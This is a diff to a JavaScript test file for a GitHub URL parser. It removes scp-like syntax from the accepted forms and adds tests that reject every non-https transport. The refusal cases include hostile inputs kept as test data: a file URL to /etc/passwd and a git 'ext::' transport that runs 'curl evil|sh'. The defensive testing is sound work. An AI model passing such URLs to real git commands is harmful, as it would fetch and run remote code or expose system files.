@@ -12,8 +12,7 @@ import { parseRepo, PROTECTED_BRANCHES, UNSAFE_BRANCH } from "./url.js";
 describe("parseRepo", () => {
   it.each([
     ["https://github.com/owner/repo", "owner", "repo"],
-    ["https://github.com/owner/repo.git", "owner", "repo"],
-    ["git@github.com:owner/repo.git", "owner", "repo"]
+    ["https://github.com/owner/repo.git", "owner", "repo"]
   ])("parses %s", (url, owner, repo) => {
     expect(parseRepo(url)).toEqual({ owner, repo });
   });
@@ -58,6 +57,25 @@ describe("parseRepo", () => {
     ["https://github.com/a|b/c", "a key separator"],
     ["https://github.com/o/r r", "a space"],
     ["https://github.com/o:1/r", "a colon"]
+  ])("refuses %s (%s)", (url) => {
+    expect(parseRepo(url)).toBeUndefined();
+  });
+
+  /**
+   * Every transport but https, including the one that used to slip through.
+   *
+   * scp-like syntax was parsed on its own branch, ahead of the protocol check,
+   * so `git@github.com:owner/repo.git` passed a gate whose refusal message
+   * promises https. Nothing downstream could act on it — isomorphic-git has no
+   * SSH transport — so it failed one step further from the model, which is the
+   * worse place for it.
+   */
+  it.each([
+    ["git@github.com:owner/repo.git", "scp-like syntax"],
+    ["ssh://git@github.com/owner/repo.git", "an explicit ssh scheme"],
+    ["http://github.com/owner/repo", "plain http"],
+    ["file:///etc/passwd", "a local path"],
+    ["ext::sh -c 'curl evil|sh'", "git's command transport"]
   ])("refuses %s (%s)", (url) => {
     expect(parseRepo(url)).toBeUndefined();
   });
